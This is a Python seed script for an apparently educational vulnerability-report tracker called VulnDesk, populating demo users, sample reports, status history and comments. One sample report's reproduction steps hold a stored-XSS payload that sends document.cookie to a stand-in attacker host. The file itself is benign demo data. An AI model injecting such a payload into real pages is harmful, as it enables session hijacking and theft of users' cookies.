"""
Idempotent Database Seed Script (backend/app/seed.py)
=====================================================================
WHAT THIS FILE DOES:
Populates the database with initial demo users (Researcher, 2nd Researcher, Banned Researcher,
Analyst, Admin), sample vulnerability reports across different workflow states, status history
entries, and comments (including an analyst-only internal note).

WHY WE WROTE IT THIS WAY:
1. Why do we need seeded demo users in the MVP? (SRS FR-30 & PRD F-01)
   In the MVP release, login/registration is not built yet (that is Milestone 4 in Beta).
   Instead, the frontend sends the `X-Demo-User` header (e.g., `alice@vulndesk.local` or
   `charlie@vulndesk.local`) to switch roles instantly during your viva demo!
2. Why did we create 5 specific users?
   - `alice@vulndesk.local` (Researcher): Primary researcher who owns Reports #1, #2, and #3.
   - `bob@vulndesk.local` (Researcher): Second researcher who owns Report #4 — lets you prove
     to your tutor that Alice cannot read or edit Bob's report (returns HTTP 404 per AC-04)!
   - `mallory@vulndesk.local` (Banned Researcher): Lets you demonstrate Submission Policy Rule (iv)
     (banned researchers are blocked from submitting reports).
   - `charlie@vulndesk.local` (Analyst): Security analyst who triages all reports and writes internal notes.
   - `admin@vulndesk.local` (Admin): Administrator who can browse all reports and history.
3. Why is the script "Idempotent"?
   Idempotent means running `python -m app.seed` 1 time or 10 times produces the exact same database
   state without crashing on duplicate emails. We check `session.exec(select(User)).first()` first!
4. Why do we call `session.flush()` before `session.commit()`?
   `session.flush()` sends the pending `INSERT INTO user` statements to the database inside the open
   transaction so PostgreSQL/SQLite assigns `alice.id`, `bob.id`, and `charlie.id`. We need those
   numeric IDs immediately to set `reporter_id=alice.id` on the sample reports, while still committing
   everything atomically at the very end with `session.commit()`.
=====================================================================
"""

from datetime import datetime, timedelta, timezone

from sqlmodel import Session, select

from app.database import create_db_and_tables, engine
from app.models import (
    Comment,
    Report,
    ReportStatus,
    Severity,
    StatusHistory,
    User,
    UserRole,
)


def seed_database(session: Session) -> dict:
    """
    Populate demo users, sample reports, status history, and comments if the database is empty.
    Returns a summary dictionary indicating whether data was seeded.
    """
    # Idempotency check: if at least one User already exists, skip seeding so we never duplicate rows
    existing_user = session.exec(select(User)).first()
    if existing_user is not None:
        return {"seeded": False, "message": "Database already contains seeded data."}

    now = datetime.now(timezone.utc)

    # -----------------------------------------------------------------
    # STEP 1: Create 5 Demo Users covering every role and test scenario
    # -----------------------------------------------------------------
    alice = User(
        name="Alice Rahman (Researcher)",
        email="alice@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        is_banned=False,
    )
    bob = User(
        name="Bob Karim (Researcher)",
        email="bob@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        is_banned=False,
    )
    mallory = User(
        name="Mallory Blocked (Banned Researcher)",
        email="mallory@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        is_banned=True,  # Used to test Submission Policy Rule (iv): banned account rejection
    )
    charlie = User(
        name="Charlie Hossain (Security Analyst)",
        email="charlie@vulndesk.local",
        role=UserRole.ANALYST.value,
        is_banned=False,
    )
    admin = User(
        name="Nadia Islam (Admin)",
        email="admin@vulndesk.local",
        role=UserRole.ADMIN.value,
        is_banned=False,
    )

    session.add_all([alice, bob, mallory, charlie, admin])
    # Flush assigns primary keys (alice.id, bob.id, charlie.id) without ending the transaction yet
    session.flush()
    alice_id = alice.id
    bob_id = bob.id
    charlie_id = charlie.id
    assert alice_id is not None and bob_id is not None and charlie_id is not None

    # -----------------------------------------------------------------
    # STEP 2: Create 4 Sample Vulnerability Reports across statuses
    # -----------------------------------------------------------------
    # Report 1: Status = NEW (owned by Alice -> Alice CAN edit or delete this report in the Viva demo!)
    r1 = Report(
        title="Stored XSS in Customer Support Ticket Subject",
        description=(
            "When submitting a support ticket on the merchant portal, the subject field is rendered "
            "without HTML entity encoding in the agent dashboard, allowing arbitrary JavaScript execution."
        ),
        component="Merchant Portal - Support Module",
        steps_to_reproduce=(
            "1. Log into Merchant Portal.\n"
            "2. Open 'New Support Ticket'.\n"
            "3. Enter payload `<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`.\n"
            "4. View ticket as a support agent."
        ),
        proposed_severity=Severity.HIGH.value,
        final_severity=None,
        status=ReportStatus.NEW.value,
        reporter_id=alice_id,
        created_at=now - timedelta(days=1),
        updated_at=now - timedelta(days=1),
    )

    # Report 2: Status = CONFIRMED (owned by Alice -> Alice CANNOT edit/delete because status != NEW)
    r2 = Report(
        title="IDOR on Invoice Download Endpoint (/api/v2/invoices/{id})",
        description=(
            "Authenticated users can download PDF invoices belonging to other organizations by "
            "incrementing the numeric invoice ID in GET /api/v2/invoices/{id} without tenant verification."
        ),
        component="Billing Service API",
        steps_to_reproduce=(
            "1. Authenticate as Organization A user.\n"
            "2. Send GET /api/v2/invoices/1042 with Org A Bearer token.\n"
            "3. Observe that Organization B's invoice PDF is returned with HTTP 200."
        ),
        proposed_severity=Severity.CRITICAL.value,
        final_severity=Severity.HIGH.value,
        status=ReportStatus.CONFIRMED.value,
        reporter_id=alice_id,
        first_responder_id=charlie_id,
        first_response_at=now - timedelta(days=2, hours=18),
        created_at=now - timedelta(days=3),
        updated_at=now - timedelta(days=2),
    )

    # Report 3: Status = REJECTED (owned by Alice -> demonstrates rejection_reason visibility!)
    r3 = Report(
        title="Missing Rate Limiting on Promotional Code Redemption",
        description=(
            "The /api/v1/checkout/promo endpoint allows unlimited rapid requests from a single IP "
            "and session, making it possible to brute-force 6-character promotional codes."
        ),
        component="Checkout Service",
        steps_to_reproduce=(
            "1. Capture POST /api/v1/checkout/promo request.\n"
            "2. Replay 500 requests per minute with different promo codes.\n"
            "3. Observe no HTTP 429 response or temporary block."
        ),
        proposed_severity=Severity.MEDIUM.value,
        final_severity=None,
        status=ReportStatus.REJECTED.value,
        rejection_reason=(
            "Invalid report: Promo codes in staging use a mock validator; production enforces "
            "Cloudflare WAF rate limiting of 10 requests/minute per IP."
        ),
        reporter_id=alice_id,
        first_responder_id=charlie_id,
        first_response_at=now - timedelta(days=4),
        created_at=now - timedelta(days=5),
        updated_at=now - timedelta(days=4),
    )

    # Report 4: Status = UNDER_REVIEW (owned by Bob -> hidden from Alice to prove ownership isolation!)
    r4 = Report(
        title="Session Token Remains Valid After Password Reset on Mobile API",
        description=(
            "After a user resets their password via the mobile recovery flow, existing active sessions "
            "on other devices remain valid and can still call protected endpoints."
        ),
        component="Mobile Auth Gateway",
        steps_to_reproduce=(
            "1. Log in on Device A and save the token.\n"
            "2. Reset password on Device B.\n"
            "3. Call GET /api/mobile/profile using Device A's old token and observe 200 OK."
        ),
        proposed_severity=Severity.HIGH.value,
        final_severity=None,
        status=ReportStatus.UNDER_REVIEW.value,
        reporter_id=bob_id,
        first_responder_id=charlie_id,
        first_response_at=now - timedelta(hours=12),
        created_at=now - timedelta(days=1, hours=6),
        updated_at=now - timedelta(hours=12),
    )

    session.add_all([r1, r2, r3, r4])
    # Flush assigns r1.id, r2.id, r3.id, r4.id so we can attach StatusHistory and Comment rows
    session.flush()
    r2_id = r2.id
    r3_id = r3.id
    r4_id = r4.id
    assert r2_id is not None and r3_id is not None and r4_id is not None

    # -----------------------------------------------------------------
    # STEP 3: Create Append-Only StatusHistory rows matching transitions
    # -----------------------------------------------------------------
    histories = [
        StatusHistory(
            report_id=r2_id,
            changed_by=charlie_id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.UNDER_REVIEW.value,
            changed_at=now - timedelta(days=2, hours=18),
        ),
        StatusHistory(
            report_id=r2_id,
            changed_by=charlie_id,
            from_status=ReportStatus.UNDER_REVIEW.value,
            to_status=ReportStatus.CONFIRMED.value,
            changed_at=now - timedelta(days=2),
        ),
        StatusHistory(
            report_id=r3_id,
            changed_by=charlie_id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.REJECTED.value,
            changed_at=now - timedelta(days=4),
        ),
        StatusHistory(
            report_id=r4_id,
            changed_by=charlie_id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.UNDER_REVIEW.value,
            changed_at=now - timedelta(hours=12),
        ),
    ]
    session.add_all(histories)

    # -----------------------------------------------------------------
    # STEP 4: Create Public Comments & an Analyst-Only Internal Note
    # -----------------------------------------------------------------
    comments = [
        Comment(
            report_id=r2_id,
            author_id=charlie_id,
            body="Thank you Alice. We reproduced the IDOR on staging and confirmed High severity.",
            is_internal=False,  # Public comment: visible to Alice, Charlie, and Admin
            created_at=now - timedelta(days=2, hours=16),
        ),
        Comment(
            report_id=r2_id,
            author_id=charlie_id,
            body="INTERNAL: Billing team is patching the tenant_id check in PR #412 today.",
            is_internal=True,   # Analyst-only note (FR-19): hidden when Alice fetches comments!
            created_at=now - timedelta(days=2, hours=15),
        ),
        Comment(
            report_id=r2_id,
            author_id=alice_id,
            body="Glad to help! Let me know when you'd like me to re-test the fix.",
            is_internal=False,  # Public reply from Researcher Alice
            created_at=now - timedelta(days=2, hours=10),
        ),
    ]
    session.add_all(comments)

    # Commit the entire seed transaction atomically
    session.commit()

    return {
        "seeded": True,
        "users": 5,
        "reports": 4,
        "status_history": len(histories),
        "comments": len(comments),
    }


if __name__ == "__main__":
    # Allow running directly from terminal via: `python -m app.seed`
    create_db_and_tables()
    with Session(engine) as db_session:
        result = seed_database(db_session)
        print(f"VulnDesk seed complete: {result}")
